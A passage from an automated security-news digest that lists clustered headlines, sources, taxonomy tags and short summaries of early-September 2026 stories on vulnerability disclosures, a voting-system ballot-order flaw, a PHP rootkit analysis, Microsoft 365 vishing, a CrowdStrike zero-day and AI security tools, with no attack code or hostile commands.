- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
An analysis of Project Glasswing findings shows only a fraction have reached disclosure, and an even smaller number have been fixed.
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: Mythos Vulnerability Firehose Hits a Human Bottleneck
  - Published: 2026-09-09T21:19:55+00:00
  - Link: https://www.darkreading.com/application-security/mythos-vulnerability-firehose-hits-human-bottleneck
  - Summary: An analysis of Project Glasswing findings shows only a fraction have reached disclosure, and an even smaller number have been fixed.

### Cluster 36383a6cd0 — score 9

- Title: Security Vulnerability in a Voting System
- Source: Schneier on Security (practitioner_analysis)
- Published: 2026-09-04T11:09:35+00:00
- Link: https://www.schneier.com/blog/archives/2026/09/security-vulnerability-in-a-voting-system.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_3_analysis

#### Summary

```
It’s a vulnerability that allows someone to recover the order of ballots cast, newly exploited with AI tools. Nearly four years since the original vulnerability was disclosed, I was still able to use it to analyze voter behavior in Georgia (one of the 21 states that uses affected scanners) in the recent May 2026 primary. Notably, I never touched a voting machine, exploited a network, examined source code, or accessed anything non-public. After pointing a coding agent to the original vulnerability paper, I supplied it with two data sources highlighted in the paper: the early-voting list for each county, and the “CVR” (cast-vote record) file, containing every ballot and its selections (but not the voters’ names or other identifying information). The CVR file is available upon request, precisely because a public, ballot-level record is what makes election results independently verifiable...
```

#### Corroborating sources (1)

- **Schneier on Security** (practitioner_analysis)
  - Title: Security Vulnerability in a Voting System
  - Published: 2026-09-04T11:09:35+00:00
  - Link: https://www.schneier.com/blog/archives/2026/09/security-vulnerability-in-a-voting-system.html
  - Summary: It’s a vulnerability that allows someone to recover the order of ballots cast, newly exploited with AI tools. Nearly four years since the original vulnerability was disclosed, I was still able to use it to analyze voter behavior in Georgia (one of the 21 states that uses affected scanners) in the recent May 2026 primary. Notably, I never touched a voting machine, exploited a network, examined source code, or accessed anything non-public. After pointing a coding agent to the original vulnerability paper, I supplied it with two data sources highlighted in the paper: the early-voting list for each county, and the “CVR” (cast-vote record) file, containing every ballot and its selections (but not the voters’ names or other identifying information). The CVR file is available upon request, precisely because a public, ballot-level record is what makes election results independently verifiable...

### Cluster dc442d78ed — score 8

- Title: Dissecting a PHP web server rootkit
- Source: Sophos X-Ops (detection_response_operations)
- Published: 2026-09-07T00:00:00+00:00
- Link: https://www.sophos.com/en-us/blog/dissecting-a-php-web-server-rootkit
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
<p>Sophos X-Ops takes a deep dive into an insidious piece of malware</p> Categories: Threat Research Tags: rootkit, php, webshell
```

#### Corroborating sources (1)

- **Sophos X-Ops** (detection_response_operations)
  - Title: Dissecting a PHP web server rootkit
  - Published: 2026-09-07T00:00:00+00:00
  - Link: https://www.sophos.com/en-us/blog/dissecting-a-php-web-server-rootkit
  - Summary: <p>Sophos X-Ops takes a deep dive into an insidious piece of malware</p> Categories: Threat Research Tags: rootkit, php, webshell

### Cluster ceda3cd5fa — score 8

- Title: The state of AI for security: Measuring what matters most for building trust
- Source: AWS Security Blog (cloud_identity_infrastructure)
- Published: 2026-09-09T19:09:14+00:00
- Link: https://aws.amazon.com/blogs/security/the-state-of-ai-for-security-measuring-what-matters-most-for-building-trust/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Security teams are starting to actively use AI for security work, including vulnerability triage, penetration testing, threat modeling, incident response, and code review. The promise is speed, but a security tool that moves fast and raises too many false alarms doesn’t save time. Engineers spend time on false alarms, on-call is noisier, and teams distrust […]
```

#### Corroborating sources (1)

- **AWS Security Blog** (cloud_identity_infrastructure)
  - Title: The state of AI for security: Measuring what matters most for building trust
  - Published: 2026-09-09T19:09:14+00:00
  - Link: https://aws.amazon.com/blogs/security/the-state-of-ai-for-security-measuring-what-matters-most-for-building-trust/
  - Summary: Security teams are starting to actively use AI for security work, including vulnerability triage, penetration testing, threat modeling, incident response, and code review. The promise is speed, but a security tool that moves fast and raises too many false alarms doesn’t save time. Engineers spend time on false alarms, on-call is noisier, and teams distrust […]

### Cluster 28edf79473 — score 8

- Title: AI SIEM Search
- Source: Huntress (detection_response_operations)
- Published: 2026-09-07T14:00:00+00:00
- Link: https://www.huntress.com/blog/ai-siem-search
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
The new Huntress AI SIEM search feature lets you find answers in plain English, with no query language fluency required. Ask questions, get results, and skip the syntax.
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: AI SIEM Search
  - Published: 2026-09-07T14:00:00+00:00
  - Link: https://www.huntress.com/blog/ai-siem-search
  - Summary: The new Huntress AI SIEM search feature lets you find answers in plain English, with no query language fluency required. Ask questions, get results, and skip the syntax.

### Cluster 4b20a7c3a0 — score 8

- Title: Managed EDR: What It Is & How to Choose a Provider
- Source: Huntress (detection_response_operations)
- Published: 2026-09-03T21:22:00+00:00
- Link: https://www.huntress.com/blog/choosing-the-right-edr-managed-vs-unmanaged
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Huntress breaks down what managed EDR is, how it differs from unmanaged, and what to look for when choosing a provider for your business.
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Managed EDR: What It Is & How to Choose a Provider
  - Published: 2026-09-03T21:22:00+00:00
  - Link: https://www.huntress.com/blog/choosing-the-right-edr-managed-vs-unmanaged
  - Summary: Huntress breaks down what managed EDR is, how it differs from unmanaged, and what to look for when choosing a provider for your business.

### Cluster 8627af6734 — score 8

- Title: How The $320M Exploit of Liquid Network Went Down
- Source: Chainalysis (ransomware_ecrime_financial_crime)
- Published: 2026-09-09T20:22:00+00:00
- Link: https://www.chainalysis.com/blog/320m-exploit-liquid-network/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Summary Purported white-hat hackers exploited the Liquid Network to withdraw $320 million in BTC from the network’s reserve. A vulnerability… The post How The $320M Exploit of Liquid Network Went Down appeared first on Chainalysis .
```

#### Corroborating sources (1)

- **Chainalysis** (ransomware_ecrime_financial_crime)
  - Title: How The $320M Exploit of Liquid Network Went Down
  - Published: 2026-09-09T20:22:00+00:00
  - Link: https://www.chainalysis.com/blog/320m-exploit-liquid-network/
  - Summary: Summary Purported white-hat hackers exploited the Liquid Network to withdraw $320 million in BTC from the network’s reserve. A vulnerability… The post How The $320M Exploit of Liquid Network Went Down appeared first on Chainalysis .

### Cluster 7e5e24fc15 — score 8

- Title: Spanner: Removing cumulative mutation limits for DML transactions
- Source: Google Cloud Security (cloud_identity_infrastructure)
- Published: 2026-09-09T16:00:00+00:00
- Link: https://cloud.google.com/blog/products/databases/spanner-removes-dml-mutation-limits/
- Fetch status: not_attempted
- Member count: 2
- Corroborating source count: 1
- Strong signals: Google Cloud

#### Cluster taxonomy (union across members)
- affected_industries: financial_services, retail_ecommerce
- affected_products: Google Cloud
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- affected_industries: financial_services, retail_ecommerce
- affected_products: Google Cloud
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
Spanner is Google Cloud’s no-compromise operational database that gives you the horizontal scale and always-on availability of a modern distributed system along with the rich feature set and familiar ecosystem of a relational database. Innovators in industries like banking, retail, media and entertainment, and AI infrastructure rely on Spanner today for their most critical workloads. We’re excited to announce a new, flexible way to handle larger, more complex transactions in Spanner, simplifying applications that need the highest levels of data consistency. Operational workloads typically combine real-time decision making with granular updates: Think: identifying fraud as part of a multi-step checkout process in an ecommerce app. These changes must be transactional; either all of them succeed or none of them do and subsequent requests see the correct data. This update to Spanner’s ACID transactions allows applications to handle more data in an update without compromising on consistency
```

#### Corroborating sources (1)

- **Google Cloud Security** (cloud_identity_infrastructure)
  - Title: Spanner: Removing cumulative mutation limits for DML transactions
  - Published: 2026-09-09T16:00:00+00:00
  - Link: https://cloud.google.com/blog/products/databases/spanner-removes-dml-mutation-limits/
  - Summary: Spanner is Google Cloud’s no-compromise operational database that gives you the horizontal scale and always-on availability of a modern distributed system along with the rich feature set and familiar ecosystem of a relational database. Innovators in industries like banking, retail, media and entertainment, and AI infrastructure rely on Spanner today for their most critical workloads. We’re excited to announce a new, flexible way to handle larger, more complex transactions in Spanner, simplifying applications that need the highest levels of data consistency. Operational workloads typically combine real-time decision making with granular updates: Think: identifying fraud as part of a multi-step checkout process in an ecommerce app. These changes must be transactional; either all of them succeed or none of them do and subsequent requests see the correct data. This update to Spanner’s ACID transactions allows applications to handle more data in an update without compromising on consistency

### Cluster 94a219b713 — score 8

- Title: Fake IT Calls Target Executives in Microsoft 365 Data Theft and Extortion Attacks
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-07T15:51:56+00:00
- Link: https://thehackernews.com/2026/09/microsoft-365-attackers-use-help-desk.html
- Fetch status: not_attempted
- Member count: 2
- Corroborating source count: 2
- Strong signals: Microsoft 365

#### Cluster taxonomy (union across members)
- threat_categories: credential_theft, mfa_bypass, phishing_social_eng, ransomware_extortion
- affected_products: Microsoft 365
- content_type: incident_report, news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft, mfa_bypass
- affected_products: Microsoft 365
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Threat hunters have disclosed details of a widespread data theft and extortion threat cluster that's targeting Microsoft 365 and other software-as-a-service (SaaS) offerings through information technology (IT) help desk vishing, adversary-in-the-middle (AitM) token theft, and residential-proxy sign-ins. The activity, which mainly singles out directors, vice presidents, and other executive staff
```

#### Corroborating sources (2)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Fake IT Calls Target Executives in Microsoft 365 Data Theft and Extortion Attacks
  - Published: 2026-09-07T15:51:56+00:00
  - Link: https://thehackernews.com/2026/09/microsoft-365-attackers-use-help-desk.html
  - Summary: Threat hunters have disclosed details of a widespread data theft and extortion threat cluster that's targeting Microsoft 365 and other software-as-a-service (SaaS) offerings through information technology (IT) help desk vishing, adversary-in-the-middle (AitM) token theft, and residential-proxy sign-ins. The activity, which mainly singles out directors, vice presidents, and other executive staff
- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: BigBear 2 PhaaS Campaign Steals 5000+ Microsoft Credentials
  - Published: 2026-09-08T09:45:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/bigbear-2-phaas-5000-microsoft/
  - Summary: CloudSEK has uncovered BigBear 2.0, a new phishing-as-a-service operation targeting Microsoft 365

### Cluster 914803cf7c — score 8

- Title: ⚡ Weekly Recap: Chrome 0-Day, Router Hijacks, Coder Supply Chain Attack and More
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-07T14:36:07+00:00
- Link: https://thehackernews.com/2026/09/weekly-recap-chrome-0-day-router.html
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: supply_chain
- content_type: intel_roundup
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain
- content_type: intel_roundup
- confidence_tier: tier_4_news

#### Summary

```
Turning off email images should at least stop the pictures. This week, attackers had a workaround: a scannable QR code built out of text. It still appears, even with images blocked. A small detail, but an annoying one if that was a precaution you were counting on. Elsewhere, a trusted software source delivered code that stole credentials, and a protocol designed for secure network management
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: ⚡ Weekly Recap: Chrome 0-Day, Router Hijacks, Coder Supply Chain Attack and More
  - Published: 2026-09-07T14:36:07+00:00
  - Link: https://thehackernews.com/2026/09/weekly-recap-chrome-0-day-router.html
  - Summary: Turning off email images should at least stop the pictures. This week, attackers had a workaround: a scannable QR code built out of text. It still appears, even with images blocked. A small detail, but an annoying one if that was a precaution you were counting on. Elsewhere, a trusted software source delivered code that stole credentials, and a protocol designed for secure network management

### Cluster 817be3097f — score 8

- Title: Researcher Publishes CrowdStrike Privilege Escalation Zero Day
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-09-07T08:28:00+00:00
- Link: https://www.infosecurity-magazine.com/news/crowdstrike-privilege-escalation/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day
- urgency_signals: zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
A security researcher has posted a zero-day exploit in CrowdStrike which could allow hackers to escalate privileges
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: Researcher Publishes CrowdStrike Privilege Escalation Zero Day
  - Published: 2026-09-07T08:28:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/crowdstrike-privilege-escalation/
  - Summary: A security researcher has posted a zero-day exploit in CrowdStrike which could allow hackers to escalate privileges

### Cluster 98d50f67e3 — score 8

- Title: Preinstalled but Not Safe. OnePlus OEM App Session Takeover Vulnerability
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-09-10T09:12:48+00:00
- Link: https://www.reddit.com/r/netsec/comments/1wcdwoi/preinstalled_but_not_safe_oneplus_oem_app_session/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
submitted by /u/nibblesec [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Preinstalled but Not Safe. OnePlus OEM App Session Takeover Vulnerability
  - Published: 2026-09-10T09:12:48+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1wcdwoi/preinstalled_but_not_safe_oneplus_oem_app_session/
  - Summary: submitted by /u/nibblesec [link] [comments]

### Cluster 703e44ce03 — score 8

- Title: Apple mach_o Archive Parser Integer Underflow Vulnerability
- Source: Reddit r/netsec (reddit_practitioner_osint)
- Published: 2026-09-10T04:02:53+00:00
- Link: https://www.reddit.com/r/netsec/comments/1wc87td/apple_mach_o_archive_parser_integer_underflow/
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Primary article taxonomy
- content_type: vulnerability_disclosure
- confidence_tier: tier_5_chatter

#### Summary

```
The vulnerability that Apple didn’t fix. submitted by /u/appsec1337 [link] [comments]
```

#### Corroborating sources (1)

- **Reddit r/netsec** (reddit_practitioner_osint)
  - Title: Apple mach_o Archive Parser Integer Underflow Vulnerability
  - Published: 2026-09-10T04:02:53+00:00
  - Link: https://www.reddit.com/r/netsec/comments/1wc87td/apple_mach_o_archive_parser_integer_underflow/
  - Summary: The vulnerability that Apple didn’t fix. submitted by /u/appsec1337 [link] [comments]
